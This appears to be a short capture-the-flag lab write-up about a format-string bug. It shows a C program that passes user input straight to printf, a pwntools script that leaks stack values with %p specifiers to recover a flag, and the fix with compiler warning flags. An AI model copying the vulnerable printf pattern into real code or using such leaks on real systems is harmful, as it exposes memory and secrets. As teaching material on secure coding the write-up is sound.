Program:
```c
#include <stdio.h>
#include <unistd.h>

int main()
{
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
	
	char flag[64];
	char *flagptr = flag;
	FILE *fp = fopen("flag.txt", "r");
	fgets(flag, 64, fp);
	fclose(fp);

	char buffer[32];
	printf("Yell: ");
	fgets(buffer, 32, stdin);
	printf("An echo is heard in the distance: ...\n");
	printf(buffer);

  return 0;
}
```
Pass the %p (format specifier) (Print this value as a pointer (memory address))

---
Exploit 
```python
from pwn import *

for i in range(1,20):
    p = process("./main")
    p.sendline(f"%{i}$p".encode())
    p.recvline()
    data = p.recvall().strip().decode()
    raw = p64(int(data,16)) if data != "(nil)" else "-"
    print(i, data, raw)
```
Solution:
Always use a constant format string with user input:
```c
printf("%s", buffer);
```
Bonus (check for errors):
```shell
gcc -Wall -Wextra -Wformat -Wformat-security 
```